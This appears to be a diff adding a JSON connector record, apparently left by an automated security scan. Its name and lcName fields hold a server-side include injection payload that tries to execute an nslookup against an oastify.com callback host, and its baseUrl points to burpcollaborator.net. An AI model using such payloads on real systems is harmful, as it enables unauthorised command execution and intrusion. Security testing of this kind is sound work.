@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/zgjZCdeP",
+	"createdTime":1741334783888,
+	"deleted":false,
+	"description":"qvaqcL",
+	"enabled":false,
+	"id":"67caa8ffb8a3852f709fe3f8",
+	"lastModifiedBy":22743,
+	"lcName":"\"-->'-->`--><!--#set var=\"xvi\" value=\"wuh3xaz3v6\"--><!--#set var=\"zxk\" value=\"ywj5zc15x8\"--><!--#echo var=\"xvi\"--><!--#echo var=\"zxk\"--><!--#exec cmd=\"nslookup -q=cname jh4qkxmqitxja17ktimk45q1ssylmcd05ytqgg45.oastify.com\" -->",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741334783888,
+	"name":"\"-->'-->`--><!--#set var=\"xvi\" value=\"wuh3xaz3v6\"--><!--#set var=\"zxk\" value=\"ywj5zc15x8\"--><!--#echo var=\"xvi\"--><!--#echo var=\"zxk\"--><!--#exec cmd=\"nslookup -q=cname jh4qkxmqitxja17ktimk45q1ssylmcd05ytqgg45.oastify.com\" -->",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
